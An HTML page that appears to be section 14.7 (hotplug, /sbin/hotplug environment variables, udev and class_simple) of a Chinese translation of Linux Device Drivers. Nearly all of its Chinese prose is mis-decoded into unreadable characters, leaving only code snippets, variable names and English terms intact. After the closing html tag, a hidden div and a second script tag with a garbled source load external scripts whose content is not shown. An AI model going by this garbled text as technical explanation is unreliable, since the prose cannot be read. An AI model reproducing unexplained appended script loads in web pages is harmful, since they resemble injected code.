<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>14.7.&#160;Ȳ-Linux豸棨İ棩</title>
<meta name="description" content="" />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,,Ƶ" />
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch14.html" title="&#160;14&#160;&#160;Linux 豸ģ">
<link rel="prev" href="ch14s06.html" title="14.6.&#160;">
<link rel="next" href="ch14s08.html" title="14.8.&#160;̼">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">14.7.&#160;Ȳ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch14s06.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;14&#160;&#160;Linux 豸ģ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch14s08.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="Hotplug.sect1"></a>14.7.&#160;Ȳ</h2></div></div></div>
<p> 2 ͬȲ. ں˿ȲΪӲ, ں˺ں֮Ľ. ûȲں˺ûռͨΪ /sbin/hotplug ĳĽ. ں˵, ֪ͨûռĳȲ¼ոںз.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="DynamicDevices.sect2"></a>14.7.1.&#160;̬豸</h3></div></div></div>
<p>"Ȳ"ձʹõڵʵʱ, еļϵͳܹϵͳеʱ豸ĳֻʧ. ǳֻͬǼǰļϵͳ, ʱԱֻ֪Ҫʱɨе豸, ǴӲصǵ豸ʧֱص. ,  USB ĳ, CardBus, PCMCIA, IEEE1394,  PCI Ȳο, Linux ںҪܹɿвʲôӲϵͳӻȥ. һĸ豸, ΪǱһֱһûκ֪ͨͻȻӵð豸.</p>
<p>ÿͬԲͬʽһ豸ʧ. , һ PCI , CardBus,  PCMCIA 豸ϵͳȥ, ͨȥ֪֮ͨǰһ. ڷǰ, еĴ PCI Ķеλ. ζҪһֱǴ PCI ߶ȡֵܹȷ 0xff ֵ.</p>
<p>һӿ drivers/usb/host/ehci-hcd.c м, һ PCI һ UBS 2.0()ƿ. Ĵѭ̽ǷƿѾϵͳȥ.</p>
<pre class="programlisting">
result = readl(ptr);
if (result == ~(u32)0)  /* card removed */
 return -ENODEV; 
</pre>
<p> USB , һ USB 󶨵豸ϵͳȥ, κιѱύ豸 urbs Դ -ENODEV ʧ. , Ҫʶȷκι I/O .</p>
<p>Ȳε豸ֻڴͳ豸, , , . дϵͳ֧ CPU ڴƳ. ˵, Linux ںȷЩ"ϵͳ"豸ļӼ, ڵ豸ҪעЩ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="ThesbinhotplugUtility.sect2"></a>14.7.2.&#160;/sbin/hotplug </h3></div></div></div>
<p>ͬǰ, ۺʱһ豸ϵͳɾ, һ"Ȳ¼". ζں˵ûռ /sbin/hotplug.  ͵һǳС bash ű, ִֻиһϵλ /etc/hot-plug.d/ Ŀ¼ĳ. ڴ󲿷ֵ Linux , ű:</p>
<pre class="screen">
DIR="/etc/hotplug.d"
for I in "${DIR}/$1/"*.hotplug "${DIR}/"default/*.hotplug ; do
 if [ -f $I ]; then
 test -x $I &amp;&amp; $I $1 ;
 fi
done
exit 1
</pre>
<p>仰˵, űе .hotplug ׺Ŀܶ¼Ȥĳ򲢵, ݸ಻ͬĻ, ЩѾں.  /sbin/hotplug űιϸڿڳעҵ, Լ hotplug(8)ֲҳ.</p>
<p>ͬǰᵽ, /sbin/hotplug ۺʱһ kobject . Ȳγһṩ¼ӵĵв. ں˺漰ضϵͳҲ趨һϵдйڷʲôϢĻ(). ЩȲγʹжոں˷ʲô, ԼǷκضĶӦȡ.</p>
<p>ݸ /sbin/hotplug вǹȲ¼, ͬ kobject  kset . ӿͨһڱǰ kset  hotplug_ops ṹ name ĵ趨; Ǹڻߴδ,  kset .</p>
<p>һֱΪ /sbin/hotplug 趨ȱʡĻ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>ACTION </span></span></dt>
<dd><p>ַ add  remove, ֻǷǱ.</p></dd>
<dt><span class="term"><span>DEVPATH </span></span></dt>
<dd><p>һĿ¼·,  sysfs ļϵͳ, ָڱٵ kobject. ע sysfs ļϵͳļص㲻ӵ·, ûռ. </p></dd>
<dt><span class="term"><span>SEQNUM </span></span></dt>
<dd><p>Ȳ¼˳. ˳һ 64-λ , ÿβȲ¼. ûռں˲ǵ˳Ȳ¼, Ϊһûռ.</p></dd>
<dt><span class="term"><span>SUBSYSTEM </span></span></dt>
<dd><p>ַͬΪǰв.</p></dd>
</dl></div>
<p>಻ͬϵͳԼĻ /sbin/hotplug , ߵ豸ӻϵͳȥ. ǵȲλص, صڷǵ(ͬ"Ȳβ"һ) struct kset_hotplug_ops ָ. ûռܹԶرҪĿҪ߷ֵ豸ģ. һͬ͵бԼӵ /sbin/hotplug еĻ. </p>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="IEEE1394FireWire.sect3"></a>14.7.2.1.&#160;IEEE1394()</h4></div></div></div>
<p>κ IEEE1394 , Ҳǻ, ϵ豸,  /sbin/hotplug  SUBSYSTEM Ϊֵ ieee1394. ieee1394 ϵͳҲ 4 :</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>VENDOR_ID </span></span></dt>
<dd><p>IEEE1394  24-λ Ӧ ID. </p></dd>
<dt><span class="term"><span>MODEL_ID </span></span></dt>
<dd><p>IEEE1394  24-λͺ ID.</p></dd>
<dt><span class="term"><span>GUID </span></span></dt>
<dd><p>豸 64-λ GUID.</p></dd>
<dt><span class="term"><span>SPECIFIER_ID </span></span></dt>
<dd><p>24-λֵ, ָ豸Эӵ.</p></dd>
<dt><span class="term"><span>VERSION </span></span></dt>
<dd><p>ָ豸Эİ汾ֵ</p></dd>
</dl></div>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Networking.sect3"></a>14.7.2.2.&#160;</h4></div></div></div>
<p>е豸һȲ¼, 豸עעں. /sbin/hotplug в name  SUBSYSTEM Ϊ net, ֻл:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>INTERFACE </span></span></dt>
<dd><p>ѾںעעĽӿڵ.  lo  eth0.</p></dd>
</dl></div>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="PCI.sect3"></a>14.7.2.3.&#160;PCI </h4></div></div></div>
<p>κ PCI ϵ豸в name  SUBSYSTEM Ϊֵ pci. PCI ϵͳҲһֱ 4 :</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>PCI_CLASS </span></span></dt>
<dd><p>豸 PCI , 16 .</p></dd>
<dt><span class="term"><span>PCI_ID </span></span></dt>
<dd><p>豸 PCI Ӧ̺豸 ID, 16, ϳĸʽ Ӧ:豸.</p></dd>
<dt><span class="term"><span>PCI_SUBSYS_ID </span></span></dt>
<dd><p>PCI ϵͳӦ̺ϵͳ豸 ID,  ϵͳӦ:ϵͳ豸 ĸʽ.</p></dd>
<dt><span class="term"><span>PCI_SLOT_NAME </span></span></dt>
<dd><p>PCI "", ں˸豸. ĸʽ :::. һӿ: 0000:00:0d.0.</p></dd>
</dl></div>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Input.sect3"></a>14.7.2.4.&#160;</h4></div></div></div>
<p>е豸(, , Ϸ, ȵ), һȲ¼豸ںʱ. /sbin/hotplug  SUBSYSTEM Ϊֵ input. ϵͳҲĻ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>PRODUCT </span></span></dt>
<dd><p>һֵַ,  16 гֵûǰ 0. ĸʽ bustype:vender:product:version.</p></dd>
</dl></div>
<p>лܳ, 豸֧:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>NAME </span></span></dt>
<dd><p>豸, ͬ豸.</p></dd>
<dt><span class="term"><span>PHYS </span></span></dt>
<dd><p>ϵͳ豸豸ַ. ٶȶ, 豸ߵλ.</p></dd>
<dt><span class="term"><span>EV</span></span></dt>
<dd></dd>
<dt><span class="term"><span>KEY</span></span></dt>
<dd></dd>
<dt><span class="term"><span>REL</span></span></dt>
<dd></dd>
<dt><span class="term"><span>ABS</span></span></dt>
<dd></dd>
<dt><span class="term"><span>MSC</span></span></dt>
<dd></dd>
<dt><span class="term"><span>LED</span></span></dt>
<dd></dd>
<dt><span class="term"><span>SND</span></span></dt>
<dd></dd>
<dt><span class="term"><span>FF </span></span></dt>
<dd><p>Щ豸ұΪʵֵض豸֧.</p></dd>
</dl></div>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="USB.sect3"></a>14.7.2.5.&#160;USB </h4></div></div></div>
<p>κ USB ϵ豸в name  SUBSYSTEM Ϊ usb. USB ϵͳҲһֱеĻ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>PRODUCT </span></span></dt>
<dd><p>һַ, idVendor/idProduct/bcdDevice ĸʽ, ָЩ USB 豸ضĳԱ.</p></dd>
<dt><span class="term"><span>TYPE </span></span></dt>
<dd><p>һ bDeviceClass/bDeviceSubClass/bDeviceProtocol ʽַ, ָЩ USB 豸ضĳԱ.</p></dd>
</dl></div>
<p> bDeviceClass ԱΪ 0, еĻҲ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>INTERFACE </span></span></dt>
<dd><p>һ bInterfaceClass/bInterfaceSubClass/bInterfaceProtocol ʽַ, ָЩ USB 豸ضԱ.</p></dd>
</dl></div>
<p>ں˽ѡ, CONFIG_USB_DEVICEFS, ѡ usbfs ļϵͳںн, ѡ, лҲ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>DEVICE </span></span></dt>
<dd><p>һַ, 豸ڵ usbfs ļϵͳг. ִ /proc/bus/usb/USB_BUS_NUMBER/USB_DEVICE_NUMBER ĸʽ,  USB_BUS_NUMBER 豸ڵ USB ߵ 3 , USB_DEVICE_NUMBER ں˷ USB 豸 3 λ.</p></dd>
</dl></div>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="SCSI.sect3"></a>14.7.2.6.&#160;SCSI </h4></div></div></div>
<p>е SCSI 豸һȲ¼ SCSI 豸ںдȥ. /sbin/hotplug в name  SUBSYSTEM Ϊ scsi ÿӻȥϵͳ SCSI 豸. ûжĻ SCSI ϵͳ, ڴἰΪһ  SCSI ضûռűʲô SCSI ( , Ŵ, ͨ, ȵ)Ӧض SCSI 豸.</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Laptopdockingstations.sect3"></a>14.7.2.7.&#160;ϥϵվ</h4></div></div></div>
<p>һּ֧弴õϥϵվе Linux ϵͳӻȥ( ͨϥϵԵվ, ȥ), һȲ¼. /sbin/hotplug в name  SUBSYSTEM Ϊ dock. ûĻ.</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="S390andzSeries.sect3"></a>14.7.2.8.&#160;S/390  zSeries</h4></div></div></div>
<p> S/390 ϵ, ߽ͨṹֺ֧ܹ㷶ΧӲ, в /sbin/hotplug ¼Ǵ Linux ϵͳӻȥʱӲ. Щ豸 /sbin/hotplug  name  SUBSYSTEM Ϊ dasd. û.</p>
</div>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="Usingsbinhotplug.sect2"></a>14.7.3.&#160;ʹ /sbin/hotplug </h3></div></div></div>
<p> Linux ںڵ /sbin/hotplug Ϊÿ豸, Ӻɾں, ǳõĹûռѱһ. 2 õĹ Linux Ȳνű udev.</p>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="Linuxhotplugscripts.sect3"></a>14.7.3.1.&#160;Linux Ȳνű</h4></div></div></div>
<p>Linux ȲνűΪ /sbin/hotplug õĵһû. Щű鿴ںõոշֵ豸ĲͬĻ, ͼһƥ豸ںģ.</p>
<p>ͬǰ, һʹ MODULE_DEVICE_TABLE ,  depmod Ϣλ /lib/module/KERNEL_VERSION/modules.*map ļ.  * ǲͬ, ֵ֧. ǰ, ģ map ļΪʹ豸, Щ豸֧ PCI, USB, IEEE1394, INPUT, ISAPNP,  CCW ϵͳ.</p>
<p>ȲνűʹЩģӳıļ, ͼʲôģ֧ں˸ոշֵ豸. Ǽеģ, ڵһƥʱֹͣ, Ϊʹں˷Ǹģ鹤. Щűκģ鵱ȥʱ. Ҫͼ, ǿżȻعرձͬһҪȥƵ豸.</p>
<p>ע,  modprobe ֱӴģж MODULE_DEVICE_TABLE ϢҪģ map ļ, ȲνűܱɾΪһС modprobe Χİװ.</p>
</div>
<div class="sect3" lang="zh-cn">
<div class="titlepage"><div><div><h4 class="title">
<a name="udev.sect3"></a>14.7.3.2.&#160;udev ɶ?</h4></div></div></div>
<p>ںдͳһģ͵һҪԭûռ䶯̬ /dev . ֮ǰʹ devfs ʵûռʵ, Ǹʧ, ȱһԾάԼһЩ޷ĺ bug. ں˿ʶе豸Ϣûռ, ܽеıҪ /dev Ĺ.</p>
<p>devfs һЩǳȱ. Ҫÿ豸޸֧, Ҫ豸ָӺڵ /dev еλ. Ҳûȷ̬α, ûռԼ򵥷ʽ豸, ǿ豸ںжûռ. Linux ں˿зǳʹں, Ϊ devfs Բѭ Linux ׼, ȷʵ.</p>
<p> Linux ں˿ʼװͷ, ûι豸.  10,000 һ豸Ĵ˷ǳѵ, ֤һضһֱʹͬ, ڴеʲôʱں˷. ͬҲĥû,  2  USB ӡǵϵͳ, ҽŷûа취֤֪Ϊ /dev/lpt0 Ĵӡı䲢Ĵӡϵͳ.</p>
<p>, udev . ͨ sysfs ûռ豸Ϣ,  /sbin/hotplug ֪ͨ豸ӻȥ. Ծ, һ豸ʲô, ûռָ, ں֮. Ᵽ֤Աںȥÿ豸ӵ.</p>
<p>ԸĹʹ udev Ϣ, 뿴ķк udev һĵ.</p>
<p>еһ豸Ҫ, Ϊ udev ȷʹ, ȷκηһƵ豸αͨ sysfs ûռ. κʹһϵͳһαŵ, Ѿϵͳ, κι. ϵͳ tty, misc, usb, input, scsi, block, i2c, network,  frame buffer ϵͳ. Լһα, ͨ cdev_init ĵû߸ϵ register_chrdev , Ҫ޸Ա udev ܹȷʹ.</p>
<p>udev һΪ dev ļ sysfs  /class/ , Ϊ˾ʲôαŸһض豸ںͨ /sbin/hotplug ӿڵʱ. һ豸ֻҪΪÿƵ豸ļ. class_simple ӿڳ׵ķ.</p>
<p>ͬ" class_simple ӿ"һ, ʹ class_simple ӿڵĵһǵ class_simple_create һ struct class_simple.</p>
<pre class="programlisting">
static struct class_simple *foo_class;
...
foo_class = class_simple_create(THIS_MODULE, "foo");
if (IS_ERR(foo_class)) {
 printk(KERN_ERR "Error creating foo class.\n");
 goto error;
}
</pre>
<p>봴һĿ¼ sysfs  /sys/class/foo.</p>
<p>ۺʱһ豸,  3 ķһα, Ӧ class_simple_device_add :</p>
<pre class="programlisting">
class_simple_device_add(foo_class, MKDEV(FOO_MAJOR, minor), NULL, "foo%d", minor); 
</pre>
<p>뵼 /sys/class/foo һĿ¼Ϊ fooN,  N 豸Ĵα. Ŀ¼ﴴһļ, dev, ǡ udev Ϊ豸һ豸ڵҪ.</p>
<p>һ豸, Ĵα, Ҫ class_simple_device_remove ȥ豸 sysfs .</p>
<pre class="programlisting">
class_simple_device_remove(MKDEV(FOO_MAJOR, minor)); 
</pre>
<p>֮, ر, Ҫ class_simple_destroy ȥ class_simple_create  class.</p>
<pre class="programlisting">
class_simple_destroy(foo_class); 
</pre>
<p>ͬ class_simple_device_add  dev ļα, һ : . ʹ class_simple ӿΪṩϵͳĿ¼еļ, ʹ print_dev_t ȷʽض豸α.</p>
</div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch14s06.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch14.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch14s08.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">14.6.&#160;&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;14.8.&#160;̼</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>